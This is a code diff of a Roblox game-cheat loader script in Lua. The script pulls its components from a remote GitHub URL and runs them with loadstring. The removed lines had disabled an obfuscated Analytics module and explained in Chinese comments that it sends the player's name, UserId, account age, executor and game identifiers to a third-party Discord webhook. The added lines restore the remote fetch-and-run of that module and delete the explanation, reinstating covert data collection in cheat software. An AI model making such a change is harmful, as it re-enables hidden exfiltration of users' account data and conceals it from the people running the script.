@@ -22,8 +22,7 @@ local BaseUrl = "https://raw.githubusercontent.com/therealcookiemonsterof1966/Ab
 getgenv().Abysall = {
     Environment = loadstring(game:HttpGet(BaseUrl .. "Components/Environment.luau"))(),
     ESPLibrary = loadstring(game:HttpGet(BaseUrl .. "Components/ESP.luau"))(),
-    -- 16Notice 这个组件在主脚本里从头到尾没被用到，这次联网也一并去掉（想还原就把它换回 loadstring 那行）
-    ["16Notice"] = { Notify = function() end },
+    ["16Notice"] = loadstring(game:HttpGet(BaseUrl .. "Components/16Notice.luau"))(),
     Legit = true
 }
 
@@ -81,12 +80,9 @@ Abysall.Interface = loadstring(game:HttpGet(
     BaseUrl .. "Components/Interface.luau"
 ))()
 
--- 【已去掉联网上报】
--- 原来这里 loadstring 拉的是 Components/Analytics.luau：那个文件是混淆过的（xor 编码字符串），
--- 作用就是把 玩家名 / UserId / 账号年龄 / 执行器名 / 游戏名 / PlaceId / JobId
--- 打包好发给一个第三方 Discord webhook。它在主脚本里从头到尾没被调用过第二次，
--- 所以换成空实现对功能没有任何影响，只是不再把你这台机器的信息发出去。
-Abysall.Analytics = { Report = function() end, Send = function() end }
+Abysall.Analytics = loadstring(game:HttpGet(
+    BaseUrl .. "Components/Analytics.luau"
+))()
 
 
 Abysall.SavePath = "Doors/Game"
